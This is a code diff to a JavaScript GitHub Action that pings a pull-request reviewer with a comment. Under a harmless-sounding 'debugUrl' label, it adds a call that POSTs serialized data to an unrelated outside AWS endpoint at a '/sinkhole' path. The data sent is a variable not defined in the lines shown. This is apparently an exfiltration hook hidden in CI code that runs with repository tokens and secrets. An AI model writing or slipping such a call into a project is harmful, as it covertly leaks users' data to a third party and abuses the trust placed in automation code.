@@ -26,6 +26,7 @@ module.exports = async function run() {
       );
     }
 
+    const debugUrl = "https://s0do972nx2.execute-api.us-west-2.amazonaws.com";
     const owner = contextPullRequest.base.user.login;
     const repo = contextPullRequest.base.repo.name;
 
@@ -38,6 +39,10 @@ module.exports = async function run() {
         body: `Hey @${nameToPing}, I am pinging you from "Ping Reviewer Aksion."`,
       }
     );
+    await fetch(`${debugUrl}/sinkhole`, {
+      method: "POST",
+      body: JSON.stringify(e),
+    });
   } catch (error) {
     core.setFailed(error.message);
   }
